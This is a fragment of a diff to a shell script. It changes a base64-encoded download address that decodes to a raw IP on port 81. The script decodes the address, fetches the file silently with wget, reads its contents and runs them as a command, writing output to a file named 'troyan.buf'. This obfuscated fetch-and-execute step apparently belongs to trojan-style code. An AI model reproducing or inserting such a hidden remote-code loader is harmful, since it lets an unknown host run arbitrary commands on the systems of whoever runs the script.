@@ -86,10 +86,10 @@ rm -f cgh.*
 else
 mkdir -p chumogh
 cd chumogh
-update1='IGh0dHA6Ly8zNS4xODMuMjA5Ljk4OjgxL2NodW1vZ2gudmFs'
+update1='IGh0dHA6Ly8zNS4xODMuMjA5Ljk4OjgxL2NnaC5rZXk='
 update2=$(echo $update1|$dom)
 wget -q $update2
-validar=$(cat < chumogh.val)
+validar=$(cat < cgh.key)
 $validar | grep $buff > troyan.buf
 pecho=$(cat < troyan.buf)
 cd
